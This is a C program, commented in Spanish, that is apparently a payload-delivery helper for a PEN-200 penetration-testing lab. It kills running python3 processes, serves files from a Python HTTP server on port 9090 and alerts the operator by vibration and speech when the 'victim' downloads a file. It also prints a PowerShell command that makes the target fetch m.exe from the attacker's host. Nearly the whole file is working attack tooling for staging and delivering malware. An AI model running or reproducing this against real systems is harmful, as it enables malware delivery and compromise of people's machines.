#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

#define LOG_FILE "nexus_server.log"

// --- Verificador de PATH y Soporte ---
void check_environment() {
    const char* tools[] = {"gcc", "g++", "javac", "php", "python3"};
    printf("\n\033[1;34m[ NEXUS ENV CHECK ]\033[0m\n");
    for(int i=0; i<5; i++) {
        char cmd[64];
        sprintf(cmd, "command -v %s > /dev/null 2>&1", tools[i]);
        if (system(cmd) == 0) printf(" [+] %-8s: INSTALADO\n", tools[i]);
        else printf(" [!] %-8s: NO ENCONTRADO (Requerido)\n", tools[i]);
    }
}

// --- Watchdog: Monitor de Descargas exitosas ---
void start_watchdog() {
    printf("\033[1;32m[*] Watchdog activado. Esperando descarga en el objetivo...\033[0m\n");
    // Comando para Termux que vibra y habla cuando el log registra un GET exitoso
    const char* watch_cmd = "tail -f nexus_server.log | grep --line-buffered \" 200 \" | "
                            "while read line; do termux-vibrate -d 500; "
                            "termux-tts-speak \"Archivo descargado por la víctima\"; done &";
    system(watch_cmd);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <IP_OBJETIVO>\n", argv[0]);
        return 1;
    }

    check_environment();
    
    // Limpieza de procesos previos
    system("pkill -f python3 > /dev/null 2>&1");
    system("fuser -k 9090/tcp > /dev/null 2>&1");

    // Iniciar Servidor con Redirección de Log para el Watchdog
    system("python3 -m http.server 9090 > nexus_server.log 2>&1 &");
    
    start_watchdog();

    printf("\n\033[1;33m>>> COMANDO PARA EL REPORTE (PEN-200) <<<\033[0m\n");
    printf("powershell -c \"IEX (New-Object Net.WebClient).DownloadFile('http://tu_ip:9090/m.exe', 'm.exe')\"\n");
    printf("--------------------------------------------------\n");

    printf("\n[*] Mantén NEXUS abierto. Recibirás una notificación al completarse la descarga.\n");
    while(1) sleep(5); // Bucle de persistencia

    return 0;
}
